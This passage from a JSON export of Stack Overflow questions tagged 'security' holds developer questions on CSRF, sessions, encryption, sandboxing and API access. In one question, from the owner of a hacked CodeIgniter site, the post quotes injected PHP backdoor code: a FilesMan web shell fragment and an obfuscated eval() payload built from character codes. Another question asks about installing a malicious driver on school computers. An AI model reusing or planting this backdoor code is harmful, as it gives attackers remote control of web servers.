tag? </p>\n\n<p>I tried this after all comments &amp; answer ,so the answer is :</p>\n\n<pre><code>&lt;?php\n$id=\"1\";\n$name=\"Harshal\";\n?&gt;\n&lt;a href=\"projects.php?id=&lt;?php echo base64_encode($id) ?&gt;&amp;name=&lt;?php echo base64_encode($name) ?&gt;\"&gt;Send&lt;/a&gt;\n</code></pre>\n\n<p>and on projects.php</p>\n\n<pre><code>&lt;?php\necho $idd=base64_decode($_GET['id']);\necho $namme=base64_decode($_GET['name']);\n?&gt;\n</code></pre>\n\n<p>It works...!!</p>\n"},{"tags":["c++","windows","security","driver","virus"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12296023,"title":"Is it possible to write a 'virus driver'?","body":"<p>Well I always spot security holes in the school system, then I report them to the sys admin, and well, almost never get fixed (or get fixed when a new school year starts)..</p>\n\n<p>Now I was using the School PC and actually saw the PC asking me to locate the drivers for my mobile phone when I connected it...</p>\n\n<p>I am wondering: would it be possible to make a .inf file and .dll file which would be installed by Windows Driver Search? For example: I plug in my phone, I have the files on my USB stick, I select to search my USB stick and windows installs the drivers... booom, root privilidges as soon as the DLL gets loaded by the system as a driver?</p>\n\n<p>Are there any code examples which could be used or can this be safely ignored in the school environment? (Like - there isn't any stuff that will be working, so there is no need to worry)</p>\n"},{"tags":["php","security","codeigniter","codeigniter-2","injection"],"answer_count":3,"favorite_count":7,"up_vote_count":9,"down_vote_count":1,"view_count":336,"score":8,"question_id":12264125,"title":"Codeigniter application getting hacked, code injected in index.php ","body":"<p>I have a codeigniter 2.0.2 project that keeps getting hacked. There are two main issues:</p>\n\n<ul>\n<li>Malicious code is being added to the start of the <code>index.php</code> file</li>\n<li>Rogue files are added to the server</li>\n</ul>\n\n<p>According to the host there are no FTP logs to indicate these files were uploaded.</p>\n\n<ol>\n<li><p>As there are no FTP upload logs related to the rogue files - does this mean it must be an exploit via the site itself e.g. a contact or upload form?</p></li>\n<li><p>The site is on shared hosting - code it be a site on the same server is also getting hacked and this is causing the problems?</p></li>\n<li><p>Would it help if I change the filename of index.php to something else?</p></li>\n<li><p>As the <code>index.php</code> is getting modified should I CHMOD it to 644?</p></li>\n<li><p>I've been looking for what the suggested permissions are for codeigniter projects but not sourced any yet. I was thinking 644 across the site apart from the upload/logs directory (777) - does this sound okay?</p></li>\n</ol>\n\n<p>Code injected to the top of the <code>index.php</code> file:</p>\n\n<p><code>&lt;?php if(isset($_GET[\"t6371n\"])){ $auth_pass=\"\";$color=\"#df5\";$default_action=\"FilesMan\";$default_use_ajax=true;$default_charset=\"Windows-</code></p>\n\n<p>which is then followed by a long preg_replace statement with a long encoded string. This is followed by a second statement:</p>\n\n<p><code>if(isset($_GET[\"w6914t\"])){$d=substr(8,1);foreach(array(36,112,61,64,36,95,80,79,83,84,91,39,112,49,39,93,59,36,109,61,115,112,114,105,110,116,102,40,34,37,99,34,44,57,50,41,59,105,102,40,115,116,114,112,111,115,40,36,112,44,34,36,109,36,109,34,41,41,123,36,112,61,115,116,114,105,112,115,108,97,115,104,101,115,40,36,112,41,59,125,111,98,95,115,116,97,114,116,40,41,59,101,118,97,108,40,36,112,41,59,36,116,101,109,112,61,34,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,80,104,112,79,117,116,112,117,116,39,41,46,115,116,121,108,101,46,100,105,115,112,108,97,121,61,39,39,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,80,104,112,79,117,116,112,117,116,39,41,46,105,110,110,101,114,72,84,77,76,61,39,34,46,97,100,100,99,115,108,97,115,104,101,115,40,104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115,40,111,98,95,103,101,116,95,99,108,101,97,110,40,41,41,44,34,92,110,92,114,92,116,92,92,39,92,48,34,41,46,34,39,59,92,110,34,59,101,99,104,111,40,115,116,114,108,101,110,40,36,116,101,109,112,41,46,34,92,110,34,46,36,116,101,109,112,41,59,101,120,105,116,59)as$c){$d.=sprintf((substr(urlencode(print_r(array(),1)),5,1).c),$c);}eval($d);}</code></p>\n\n<p>There is a contact form and a form where a user can upload items using CKFinder 2.0.1. Going to update this and see if that resolves it.</p>\n"},{"tags":["flex","security","google-maps","google"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":756,"score":1,"question_id":6958075,"title":"Getting a Screenshot of a Google Map in Flex (Security Error Workaround)","body":"<p>I have a Google map in my flex app that I need to occasionally export to an image file. Every time I try to call the, Map.getPrintableBitmap() or ImageSnapshot.captureBitmapData() functions I get the Error #2123: Security sandbox violation.</p>\n\n<p>I've tried adding various security allowances like:</p>\n\n<pre><code>Security.allowDomain(\"*.google.com\"); \nSecurity.allowDomain(\"*.googleapis.com\"); \n</code></pre>\n\n<p>and forcing the app to read Google's crossdomain:</p>\n\n<pre><code>Security.loadPolicyFile(\"http://mt0.google.com/crossdomain.xml\");\nSecurity.loadPolicyFile(\"http://mt1.google.com/crossdomain.xml\");\nSecurity.loadPolicyFile(\"http://maps.google.com/crossdomain.xml\");\nSecurity.loadPolicyFile(\"http://maps.googleapis.com/crossdomain.xml\");\n</code></pre>\n\n<p>...and it makes no difference.</p>\n\n<p>My biggest question is: <strong>WHY IS THE APP TRYING TO ACCESS A REMOTE FILE AT ALL??</strong>\nI'm asking for a bitmap representation of a component that's already been drawn on the client's screen. Clearly all the information necessary to provide that bitmap is already present in local memory.</p>\n\n<p>Anyways, has anyone found a workaround for this?</p>\n\n<p>I'm using version 1.20 of Google Maps for Flex.</p>\n\n<p>Here's some example code that should reproduce the error I'm getting. Note: it requires the Google Maps for Flex library to be installed</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;s:Application xmlns:fx=\"http://ns.adobe.com/mxml/2009\" \n               xmlns:s=\"library://ns.adobe.com/flex/spark\" \n               xmlns:mx=\"library://ns.adobe.com/flex/mx\" minWidth=\"955\" minHeight=\"600\"\n\n\n               initialize=\"initComp()\"&gt;\n\n&lt;mx:Canvas id=\"mapContainer\" x=\"100\" y=\"100\" width=\"980\" height=\"620\" &gt;\n        &lt;/mx:Canvas&gt;\n\n&lt;mx:Button label=\"Try Export\" click=\"exportMap()\" /&gt;\n\n\n\n\n&lt;fx:Script&gt;&lt;![CDATA[\n    import com.google.maps.Map;\n\n    import mx.graphics.codec.PNGEncoder;\n\n    private var gMap:Map;\n\nprivate function initComp():void{\n    gMap = new Map();\n    gMap.sensor = \"false\";\n    Security.allowInsecureDomain(\"*.google.com\");\n    Security.allowInsecureDomain(\"*.googleapis.com\"); \n\n    //local debug\n    gMap.key = //\"[API KEY]\";\n\n\n\n    gMap.width = 980;\n    gMap.height = 620;\n\n    mapContainer.addChild(gMap);\n}\n\npublic function exportMap():void{\n    /*Security.loadPolicyFile(\"http://mt0.google.com/crossdomain.xml\");\n    Security.loadPolicyFile(\"http://mt1.google.com/crossdomain.xml\");\n    Security.loadPolicyFile(\"http://maps.google.com/crossdomain.xml\");\n    Security.loadPolicyFile(\"http://maps.googleapis.com/crossdomain.xml\");*/\n    //var snapshot:BitmapData = ImageSnapshot.captureBitmapData(mapComponent);\n\n    var snapshot:BitmapData = gMap.getPrintableBitmap().bitmapData;\n    var encoder:PNGEncoder = new PNGEncoder();\n    var pngData:ByteArray = encoder.encode(snapshot);\n\n    var ref:FileReference = new FileReference();\n    //ref.addEventListener(IOErrorEvent.IO_ERROR, onFileSaveError);\n    ref.save(pngData, \"OneView-Map.png\");\n}\n\n]]&gt;&lt;/fx:Script&gt;\n&lt;/s:Application&gt;\n</code></pre>\n"},{"tags":["security","api","web-applications"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":250,"score":5,"question_id":5333368,"title":"How can you prevent arbitrary client apps from using your anonymous web API?","body":"<p>Apologies if this has already been asked and answered; I've looked around a bunch but haven't found exactly what I'm asking.</p>\n\n<p>--</p>\n\n<ol>\n<li><p>Suppose my web app at <a href=\"http://example.com/\">http://example.com/</a> uses a private and undocumented web API at <a href=\"http://api.example.com/\">http://api.example.com/</a> to fetch data, e.g. via XHR or JSONP.</p></li>\n<li><p>Also suppose that this web app is anonymous &mdash; it does <em>not</em> require user login.</p></li>\n<li><p>Since there's communication between client and server, anyone can open Fiddler, etc. to see the exact request and response, not to mention inspect the client-side JS code.</p></li>\n</ol>\n\n<p>In a case like this, how can you prevent someone from using your API in a <strong><em>non-web</em></strong> client app? E.g. an iPhone app, or server-side.</p>\n\n<p>To my understanding, point #2 removes the option of something like OAuth, and point #3 removes the option of e.g. API keys or even SSL.</p>\n\n<p>I've thought about things like time-based tokens or secret salts that are injected into the page on first load, but an iPhone app could easily just secretly load your webpage before making API requests.</p>\n\n<p>So is there any way besides just plain obfuscation &mdash; security through obscurity?</p>\n\n<p>--</p>\n\n<p>In case all that is too abstract, here's a simple example:</p>\n\n<p>Google.com fetches its auto-complete data via some API that's private and undocumented &mdash; but open on the web. What's to stop me from using it in my iPhone app?</p>\n"},{"tags":["security","telerik","asp.net-mvc-4"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":321,"score":0,"question_id":12290017,"title":"MVC4 security issue for a Telerik project template","body":"<p>I am having a problem with the AccountModel setup with MVC 4.</p>\n\n<p>I created a Telerik MVC 4 project and then tried to implement the AccountModel setup that Microsoft has for an MVC 4 project template and am receiving the below error: It has a public key token and appears to be a stnongly typed assembly.</p>\n\n<pre><code>\"The pre-application start initialization method Start on type Microsoft.Web.WebPages.OAuth.PreApplicationStartcode threw and exception with the following error message: Could not load file or assembly 'DotNetOpenAuth.Core, Version 4.0.0.0'\"\n</code></pre>\n\n<p>If I create the Microsoft MVC 4 project template with security as a stand alone project, no issues...</p>\n\n<p>How do I get by this error and incorporate it into my Telerik project?</p>\n\n<p>btw, not sure if I installed them or they were there when the project was created, but the following packages exist for the project and are in my reference list. It says it's having issues with the 4.0 version in my original post.</p>\n\n<pre><code>&lt;package id=\"DotNetOpenAuth.AspNet\" version=\"4.0.3.12153\" targetFramework=\"net45\" /&gt;\n\n  &lt;package id=\"DotNetOpenAuth.Core\" version=\"4.0.3.12153\" targetFramework=\"net45\" /&gt;\n\n  &lt;package id=\"DotNetOpenAuth.OAuth.Consumer\" version=\"4.0.3.12153\" targetFramework=\"net45\" /&gt;\n\n  &lt;package id=\"DotNetOpenAuth.OAuth.Core\" version=\"4.0.3.12153\" targetFramework=\"net45\" /&gt;\n\n  &lt;package id=\"DotNetOpenAuth.OpenId.Core\" version=\"4.0.3.12153\" targetFramework=\"net45\" /&gt;\n\n  &lt;package id=\"DotNetOpenAuth.OpenId.RelyingParty\" version=\"4.0.3.12153\" targetFramework=\"net45\" /&gt;\n</code></pre>\n"},{"tags":["html","security","ssl","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12292701,"title":"Are uploaded files on an SSL site encrpyted?","body":"<p>Using a form inside a HTML such that the input is:</p>\n\n<pre><code>&lt;input id=\"afile\" type=\"file\" accept=\"*.csv\" name=\"afile\"&gt;\n</code></pre>\n\n<p>And sent via javascript like:</p>\n\n<pre><code>  $(function() {\n    $('#afile').change(onChange);\n  });\n\n  function onChange() {\n    var file = this.files[0];\n    var fd = new FormData();\n    fd.append(\"afile\", file);\n\n    var xhr = new XMLHttpRequest();\n    xhr.open('POST', 'upload/handle_upload.php5', true);\n    xhr.send(fd);\n  } \n</code></pre>\n\n<p>I watch the request data in the Net panel of Firebug and Live HTTP headers but all data appears in plaintext (I am assuming that they are showing pre-encrpytion).</p>\n\n<p>Is the file encrypted before transfer? If so, when does the file become encrypted?</p>\n"},{"tags":["ruby-on-rails","security","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":45,"score":-1,"question_id":12292510,"title":"Do any rails authentication gems implement the secure salted hashing outlined here: crackstation.net/hashing-security.htm","body":"<p>I'm trying to select a rails login/authentication gem that implements a strong salted hashing algorithm using the best practice methods outlined at this site:  </p>\n\n<p><a href=\"http://crackstation.net/hashing-security.htm\" rel=\"nofollow\">http://crackstation.net/hashing-security.htm</a>  </p>\n\n<p>Do you know which Rails gems which can support full login / logout / password recovery + these hashing requirements?  </p>\n"},{"tags":["java","security","certificate","ocsp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":12279008,"title":"How to resolve RevocationStatus of OCSP in eclipse?","body":"<p>When I import <strong>import sun.security.provider.certpath.OCSP.RevocationStatus;</strong> at my class,</p>\n\n<p>I have an error  :</p>\n\n<p><strong>RevocationStatus can not be resolved to a type.</strong></p>\n\n<p><strong>import sun.security.provider.certpath.OCSP can not be resolved.</strong></p>\n\n<p>How to resolve this problem? Please, explain me.</p>\n"},{"tags":["php","security","session","sessionid"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":59,"score":3,"question_id":12291991,"title":"What's dangerous about echoing the SID","body":"<p>On <a href=\"http://www.php.net/manual/en/session.idpassing.php\" rel=\"nofollow\"><strong>this</strong></a> page it says</p>\n\n<blockquote>\n  <p>The <code>htmlspecialchars()</code> may be used when printing the SID in order to prevent XSS related attacks.</p>\n</blockquote>\n\n<p>What possible attack can someone do if you print the SID without using <code>htmlspecialchars()</code> ?</p>\n\n<p>The session ID can only contain numbers and letters. Am I missing something?</p>\n"},{"tags":["php","security","session","authentication","webhooks"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12128582,"title":"Authenticate User In Third Party Invoked WebHook","body":"<p>I have a setup in which</p>\n\n<ol>\n<li>the user may or may not log on to my site,</li>\n<li>the user submits a form to a 3rd party service, and</li>\n<li>the 3rd party service does its thing, then invokes a \"webhook\" on my site, forwarding all <code>$_POST</code> data.</li>\n</ol>\n\n<p>So, to illustrate:</p>\n\n<pre><code>    +---------------------+         +---------------------------+\n    | mysite.com/form.php |--------&gt;| thirdparty.com/submit.php |\n    +---------------------+         +---------------------------+\n                                                  |\n                                                  v\n                                    +---------------------------+\n                                    |   mysite.com/webhook.php  |\n                                    +---------------------------+\n</code></pre>\n\n<p><strong>If the user was logged on at the time of submitting the form, then how can I tell and authenticate this fact in the webhook?</strong></p>\n\n<p>For example, I could naively set a hidden field,</p>\n\n<pre><code>&lt;input type=\"hidden\" name=\"loggedOn\" value=\"true\" /&gt;\n</code></pre>\n\n<p>But anyone can spoof that.  I thought I might pass through the user's password hash,</p>\n\n<pre><code>&lt;input type=\"hidden\" name=\"passwordHash\" value=\"$2a$08$Lg5XF1Tt.X5TGyfb43vBBeEFZm4GTXQhKQ6SY6emkcnhAGT8KfxFS\" /&gt;\n</code></pre>\n\n<p>Effectively making the webhook \"log in\" again, but this can't be correct, as it would expose the user's password hash to the client-side.</p>\n\n<p>I think there must be a better way to do this using session mechanics but I'm new to sessions.  Perhaps I'm missing the appropriate vocabulary?  Would someone guide me in the right direction?  Thanks!</p>\n\n<hr />\n\n<p><strong>EDIT:</strong></p>\n\n<p>After further research I believe the correct method is to set a hidden form field <code>sid</code> to the session id, <code>session_id()</code>, in order to pass it to the webhook, which in turn will use the session id to continue the session, <code>session_id($_POST['sid']); session_start();</code>.  My question is now whether this is the canonical (and secure) solution.</p>\n"},{"tags":["c#","security","exception","appdomain","sandbox"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":447,"score":4,"question_id":7784615,"title":"C# AppDomain sandbox security exception when subscribing to domain events","body":"<p>I'm writing a plugin system to run client-provided untrusted code in my server application (C#, .NET 4.0). In order to do this, i'm running each plugin in a new sandboxed AppDomain.</p>\n\n<p>However, I'm stuck on a security exception that I don't really understand the reason for. I have made a streamlined console application sample to illustrate the problem:</p>\n\n<pre><code>namespace SandboxTest\n{\n    class Program\n    {\n        static void Main( string[] args )\n        {\n            Sandbox sandbox = new Sandbox();\n            Console.ReadLine();\n        }\n    }\n\n    class Sandbox\n    {\n        AppDomain domain;\n\n        public Sandbox()\n        {\n            PermissionSet ps = new PermissionSet( PermissionState.None );\n            ps.AddPermission( new SecurityPermission( SecurityPermissionFlag.Execution ) );\n\n            try\n            {\n                domain = AppDomain.CreateDomain( \"Sandbox\", AppDomain.CurrentDomain.Evidence, AppDomain.CurrentDomain.SetupInformation, ps );\n                domain.AssemblyLoad += new AssemblyLoadEventHandler( domain_AssemblyLoad );\n                domain.AssemblyResolve += new ResolveEventHandler( domain_AssemblyResolve );\n            }\n            catch( Exception e )\n            {\n                Trace.WriteLine( e.ToString() );\n                throw e;\n            }\n        }\n\n        static Assembly domain_AssemblyResolve( object sender, ResolveEventArgs args )\n        {\n            return null;\n        }\n\n        static void domain_AssemblyLoad( object sender, AssemblyLoadEventArgs args )\n        {\n\n        }\n    }\n}\n</code></pre>\n\n<p>Upon running this code, I'm getting the following exception on the domain.AssemblyLoad line:</p>\n\n<pre><code>A first chance exception of type 'System.Security.SecurityException' occurred in SandboxTest.exe\n'SandboxTest.vshost.exe' (Managed (v4.0.30319)): Loaded 'C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Configuration\\v4.0_4.0.0.0__b03f5f7f11d50a3a\\System.Configuration.dll', Skipped loading symbols. Module is optimized and the debugger option 'Just My Code' is enabled.\nSystem.Security.SecurityException: Request for the permission of type 'System.Security.Permissions.ReflectionPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089' failed.\n   at System.Security.CodeAccessSecurityEngine.ThrowSecurityException(RuntimeAssembly asm, PermissionSet granted, PermissionSet refused, RuntimeMethodHandleInternal rmh, SecurityAction action, Object demand, IPermission permThatFailed)\n   at System.Security.CodeAccessSecurityEngine.ThrowSecurityException(Object assemblyOrString, PermissionSet granted, PermissionSet refused, RuntimeMethodHandleInternal rmh, SecurityAction action, Object demand, IPermission permThatFailed)\n   at System.Security.CodeAccessSecurityEngine.CheckHelper(PermissionSet grantedSet, PermissionSet refusedSet, CodeAccessPermission demand, PermissionToken permToken, RuntimeMethodHandleInternal rmh, Object assemblyOrString, SecurityAction action, Boolean throwException)\n   at System.Security.CodeAccessSecurityEngine.CheckHelper(CompressedStack cs, PermissionSet grantedSet, PermissionSet refusedSet, CodeAccessPermission demand, PermissionToken permToken, RuntimeMethodHandleInternal rmh, RuntimeAssembly asm, SecurityAction action)\n   at System.Security.CodeAccessSecurityEngine.Check(Object demand, StackCrawlMark&amp; stackMark, Boolean isPermSet)\n   at System.Security.CodeAccessSecurityEngine.Check(CodeAccessPermission cap, StackCrawlMark&amp; stackMark)\n   at System.Security.CodeAccessPermission.Demand()\n   at System.DelegateSerializationHolder.GetDelegateSerializationInfo(SerializationInfo info, Type delegateType, Object target, MethodInfo method, Int32 targetIndex)\n   at System.MulticastDelegate.GetObjectData(SerializationInfo info, StreamingContext context)\n   at System.Runtime.Serialization.ObjectCloneHelper.GetObjectData(Object serObj, String&amp; typeName, String&amp; assemName, String[]&amp; fieldNames, Object[]&amp; fieldValues)\n\n\n   at System.AppDomain.add_AssemblyLoad(AssemblyLoadEventHandler value)\n   at SandboxTest.Sandbox..ctor() in C:\\Dev\\Projects\\Botfield\\SandboxTest\\Program.cs:line 36\nThe action that failed was:\nDemand\nThe type of the first permission that failed was:\nSystem.Security.Permissions.ReflectionPermission\nThe first permission that failed was:\n&lt;IPermission class=\"System.Security.Permissions.ReflectionPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\nversion=\"1\"\nFlags=\"MemberAccess\"/&gt;\n\nThe demand was for:\n&lt;IPermission class=\"System.Security.Permissions.ReflectionPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\nversion=\"1\"\nFlags=\"MemberAccess\"/&gt;\n\nThe granted set of the failing assembly was:\n&lt;PermissionSet class=\"System.Security.PermissionSet\"\nversion=\"1\"&gt;\n&lt;IPermission class=\"System.Security.Permissions.SecurityPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\nversion=\"1\"\nFlags=\"Execution\"/&gt;\n&lt;/PermissionSet&gt;\n</code></pre>\n\n<p>My best guess is that there's some event-subscription code under the hood executing in the new sandboxed AppDomain without the required security permissions, but I don't know how to work around it without giving full reflection-capacity to the sandboxed AppDomain. Does anyone have a suggestion or explanation, please?</p>\n"}]}
{"total":17772,"page":17,"pagesize":100,"questions":[{"tags":["asp.net","security","sso","identity","wif"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":267,"score":0,"question_id":12286044,"title":"Custom STS with Windows Identity Foundation (.NET 4.5)","body":"<p>I need to implement a custom STS with Visual Studio 2012 with a login page for SSO (and SSOut) with different web applications (with different permissions, claims and .NET fxs, 3.5, 4.0 y 4.5). \nCan you help me to achieve this thing?\nAny advice is welcome.</p>\n"},{"tags":["javascript","security","cookies","cross-domain","bookmarklet"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12291043,"title":"Is a javascript bookmarklet that can set domain cookies breaking cross-domain security?","body":"<p>I am creating a bookmarklet that is to be used across a wide range of domains. I wanted to set some cookies to store temporary settings for this bookmarklet, so I assumed that setting a cookie from this script would assign the cookie to the domain of the script's origin.</p>\n\n<p>This was not the case, the bookmarklet is able to assign cookies to the domain of the current site being viewed. This is not suitable for my needs (this would remember settings per domain, rather than for the bookmarklet across all domains).</p>\n\n<p>My question is, is this somehow breaking the cross domain policy? And a follow up question, how can I store cookies for the bookmarklet rather than the correct domain it is used on.</p>\n"},{"tags":["iphone","ios","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":53,"score":-1,"question_id":12288907,"title":"iPhone application that prevents users from text messaging","body":"<p>I am trying to build an iPhone application that will be able to go into a certain type of lockdown mode. Essentially, all a user would be able to do in this mode is receive phone calls. </p>\n\n<p>Is this possible? Will the iPhone allow it?</p>\n"},{"tags":["security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":27,"score":2,"question_id":12287981,"title":"How accurately can you define the characteristics of a finger on a touch screen device?","body":"<p>Could you build a finger print reader with current phone technology?</p>\n"},{"tags":["android","ios","security","encryption","offline-browsing"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":3,"view_count":310,"score":2,"question_id":11738473,"title":"Google Drive/Dropbox like solutions with Offline access and local security and Cross Platform","body":"<p>Are there any software solutions or SDKs parts that handle the following:</p>\n\n<ul>\n<li>Propose something like google docs or dropbox, with secured storage for enterprise</li>\n<li>Documents are stored for offline access</li>\n<li>Documents are encrypted</li>\n<li>Solution work on iOS, Android and if possible Windows / Mac OS</li>\n</ul>\n\n<p>I know that google docs will propose offline access and distribute an application on IPad but I would like to know if there are alternatives ?</p>\n\n<p>Thank you</p>\n\n<p>Regards</p>\n"},{"tags":["security","penetration-testing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":11900399,"title":"Penetration Testing HTML Posting Issue","body":"<p>We are planning to go for a security testing certificate. For that reason we are using Paros tool to test our system.\nThe system is written in GWT on front end and database connectivity is happening through Hibernate.\nWhen we use this tool to test our application following behaviour is happening which needs to be restricted.</p>\n\n<p>The tool is able to see the data which is passed to server. This is fine but when we make any changes in the data through tool it gets updated in the system on database end. This is a big security issue.</p>\n\n<p>Can someone guide me in this?</p>\n"},{"tags":["java","security","permissions","jsm"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12285469,"title":"Get path from FileDescriptor in Java","body":"<p>Some quick background on my problem:</p>\n\n<p>I'm writing a compiler that converts Domain Type Enforcement specs into Java Security Manager code. In a nutshell, DTE defines \"types\" (objects), assigns paths to those types; then defines \"domains\" (subjects), and defines what permissions (rwxdc) domains have to various types. I need to emulate this behavior as closely as possible in the JSM.</p>\n\n<p>Currently I'm working on write permissions. I've overridden the JSM's checkWrite(String filename) method successfully. Next on the list is checkWrite(FileDescriptor filedescriptor) and this one is proving trickier. Due to the way DTE is defined, I need path information to determine whether a write action is permissible.</p>\n\n<ul>\n<li><p>Is it possible to extract path data from a FileDescriptor? I'm guessing no -- I've checked the documentation and various tutorials, and I've found nothing to suggest that there's any way for me to obtain this information (I'd be delighted to be shown wrong, however; that would make my job easier).</p></li>\n<li><p>If the answer to the above is NO, could anyone suggest a viable workaround? For example, is there some way I could write native code to do what I want and tie this into my custom JSM class? I'm fine with doing something \"advanced\" like that, but I'd need some idea how to get started.</p></li>\n<li><p>Or is my <em>only</em> option basically to deny all write permissions that use a FileDescriptor? I'd very much like to avoid this because it's a crummy solution, but if that's the reality I need to know.</p></li>\n</ul>\n\n<p>Thanks very much for your time.</p>\n"},{"tags":["javascript","ajax","security","web-applications","http-headers"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12286060,"title":"How protect page against High Tech CRSF","body":"<p>Technology range: PHP, MySQL, Apache, javascript, ajax.</p>\n\n<p><strong>CRSF</strong></p>\n\n<p>User is logged into his secure page.</p>\n\n<p>Page uses a random token and random name. (For Input)</p>\n\n<pre><code>   &lt;input name=\"random_name\" value=\"random_token\" /&gt;\n</code></pre>\n\n<p>Random_name and Random_token are stored in user SESSION.</p>\n\n<p>Script checks header (HTTP 1.1 - referrer).</p>\n\n<p>In my opinion these methods can't protected me vs Ajax (Page output) analysing.</p>\n\n<hr>\n\n<p><strong>Ajax (Page output) analyse:</strong></p>\n\n<p>User was visit a bad page.</p>\n\n<p>After loaded page,\nAjax made a connection (with a prepared HTTP referrer header) to his page.\nAnd download data.</p>\n\n<p>Parse output (inputs).</p>\n\n<p>And after successful parse.</p>\n\n<p>Create own request with, Random_name, Random_token and prepared referrer header.</p>\n\n<hr>\n\n<p>Security system accepted this action. (Referrer - OK, Token - OK)</p>\n\n<p>How do I avoid it?</p>\n"},{"tags":["security","encryption","data","client"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12286143,"title":"How to properly encrypt TCP-data so an evil client can't read/decrypt it","body":"<p>I'll explain better my problem.</p>\n\n<p>I have a C# client which connects to a Python server, this client should send (just once) some data to the server when the connection is established, this data shouldn't be tampered.</p>\n\n<p>I have no idea about cryptography but I read some algorithms like RSA, where a public key is used for crypt the data and the private key is used for decrypt it.</p>\n\n<p>What I wanna try to do is to create a pair of keys and send the public key to the client, encrypt the data with this key and send the encrypted data to the server, I think using this way the data can't be decrypted nor tampered, every client connected will have a different pair of keys.\nIs this possible? I've been searching but I don't really understand how RSA works.\nAny ideas on how to do this?</p>\n\n<p>And sorry for my probably bad English :P</p>\n"},{"tags":["javascript","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":95,"score":1,"question_id":12282186,"title":"Security in JavaScript Code","body":"<p>I am starting to build/design a new single page web application and really wanted to primarily use client-side technology (HTML, CSS, JavaScript/CoffeScript) for the front-end while having a thin REST API back-end to serve data to the front-end.  An issue that has come up is about the security of JavaScript.  For example, there are going to be certain links and UI elements that will only be displayed depending on the roles and resources the user has attached to them.  When the user logs in, it will make a REST call that will validate the credentials and then return back a json object that has all the permissions for that user which will be stored in a JavaScript object.</p>\n\n<p>Lets take this piece of javascript:</p>\n\n<pre><code>// Generated by CoffeeScript 1.3.3\n(function() {\n  var acl, permissions, root;\n\n  root = typeof exports !== \"undefined\" &amp;&amp; exports !== null ? exports : this;\n\n  permissions = {\n    //data\n  };\n\n  acl = {\n    hasPermission: function(resource, permission, instanceId) {\n      //code.\n    }\n  };\n\n  root.acl = acl;\n\n}).call(this);\n</code></pre>\n\n<p>Now this code setup make sure even through the console, no one can modify the variable permissions.  The issue here is that since this is a single page application, I might want to update the permissions without having to refresh the page (maybe they add a record that then needs to be added to thier permissions).  The only way I can think of doing this is by adding something like</p>\n\n<pre><code>setPermission: function(resource, permission, instanceId){\n  //code\n}\n</code></pre>\n\n<p>to the acl object however if I do that, that mean someone in the browser console could also use that to add permissions to themself that they should not have.  Is there any way to add code that can not be accessed from the browser console however can be accessed from code in the JavaScript files?</p>\n\n<p>Now even if I could prevent the issue described above, I still have a bigger one.  No matter what I am going to need to have the hasPermission functionality however when it is declared this way, I can in the browser console overwrite that method by just doing:</p>\n\n<pre><code>acl.hasPermission(resource, permission, instanceId){return true;}\n</code></pre>\n\n<p>and now I would be able to see everything.  Is there anyway to define this method is such a way that a user can not override it (like marking it as final or something)?</p>\n\n<p>Something to note is that every REST API call is also going to check the permissions too so even if they were to see something they should not, they would still not be able to do anything and the REST API would regret the request because of permissions issue.  One suggestion has been made to generate the template on the server side however I really don't like that idea as it is creating a very strong coupling between the front-end and back-end technology stacks.  If for example for whatever reason we need to move form PHP to Python or Ruby, if the templates are built on the client-side in JavaScript, I only have to re-build the REST API and all the front-end code can stay the same but that is not the case if I am generating templates on the server side.</p>\n"},{"tags":["regex","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12272784,"title":"Safety of executing arbitrary regular expressions","body":"<p>I really can't think of any, but could there be malicious effects of allowing users to run arbitrary regular expressions?</p>\n\n<p>For example, say I have a website where people can try out regular expressions on a block of text -- is there anything I'd have to \"sanitize\" in the same way as for SQL statements?</p>\n"},{"tags":["java","spring","security","aspectj","spring-aop"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12277944,"title":"How to catch exception in Join point which was thrown from 